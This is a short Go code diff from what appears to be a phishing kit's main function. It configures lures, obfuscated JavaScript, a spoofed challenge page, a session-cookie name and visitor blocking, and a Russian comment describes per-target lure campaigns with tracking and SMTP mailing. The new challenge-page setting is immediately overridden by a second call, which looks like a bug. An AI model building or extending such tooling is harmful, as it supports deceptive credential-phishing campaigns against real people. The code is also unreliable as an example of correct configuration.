@@ -204,7 +204,10 @@ func main() {
 	eng.SetLures(luresStore)
 	eng.SetJS(obfuscate.Obfuscate)
 	eng.SetLimiter(ratelimit.New(120, time.Minute))
-	eng.SetChallenge(puppet.Reporter{Block: blocked, Bus: bus})
+	eng.SetChallenge(puppet.Reporter{Prefix: cfg.ChallPath, Block: blocked, Bus: bus})
+	eng.SetChallengePrefix(cfg.ChallPath)
+	eng.SetSidName(cfg.SessCookie)
+	eng.SetChallengePage(func() string { return spoof.ChallengeFor(cfg.ChallPath) })
 	eng.SetChallengePage(spoof.Challenge)
 
 	// Кампании: per-target приманки + трекинг + рассылка (SMTP только env).
